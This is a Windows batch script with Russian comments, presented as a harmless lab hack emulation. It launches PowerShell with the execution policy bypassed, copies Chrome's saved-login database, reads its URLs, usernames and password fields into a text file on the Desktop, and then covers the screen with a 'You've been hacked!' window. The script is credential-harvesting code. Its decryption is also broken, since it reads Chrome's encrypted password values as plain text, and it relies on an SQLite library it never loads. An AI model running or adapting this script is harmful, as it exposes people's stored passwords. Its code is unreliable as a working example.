@echo off
title TestPayload

:: ============================================================
:: Лабораторный скрипт: эмуляция взлома без реального вреда
:: 1. Извлекает сохранённые пароли из Google Chrome
:: 2. Записывает их в файл на рабочем столе
:: 3. Показывает полноэкранное окно "Вас взломали!"
:: ============================================================

:: Извлекаем пароли Chrome через PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$chromePath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"; ^
$tempDb = \"$env:TEMP\\chrome_temp.db\"; ^
Copy-Item \"$chromePath\" $tempDb -ErrorAction SilentlyContinue; ^
$conn = New-Object Data.SQLite.SQLiteConnection(\"Data Source=$tempDb\"); ^
$conn.Open(); ^
$cmd = $conn.CreateCommand(); ^
$cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'; ^
$reader = $cmd.ExecuteReader(); ^
$data = @(); ^
while ($reader.Read()) { ^
    $url = $reader.GetString(0); ^
    $user = $reader.GetString(1); ^
    $pass = [System.Text.Encoding]::UTF8.GetString($reader.GetValue(2)); ^
    $data += \"$url | $user | $pass\"; ^
} ^
$conn.Close(); ^
$data | Out-File -FilePath \"$env:USERPROFILE\\Desktop\\passwords.txt\" -Encoding UTF8; ^
Remove-Item $tempDb"

:: Полноэкранное окно "Вас взломали!"
powershell -NoProfile -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
$f=New-Object Windows.Forms.Form; ^
$f.FormBorderStyle='None'; ^
$f.WindowState='Maximized'; ^
$f.BackColor='Black'; ^
$l=New-Object Windows.Forms.Label; ^
$l.Text='Вас взломали!'; ^
$l.ForeColor='Red'; ^
$l.Font=New-Object System.Drawing.Font('Courier New',72,[System.Drawing.FontStyle]::Bold); ^
$l.AutoSize=$false; ^
$l.TextAlign='MiddleCenter'; ^
$l.Dock='Fill'; ^
$f.Controls.Add($l); ^
$f.Add_KeyDown({if($_.KeyCode -eq 'Escape'){$f.Close()}}); ^
$f.ShowDialog()"
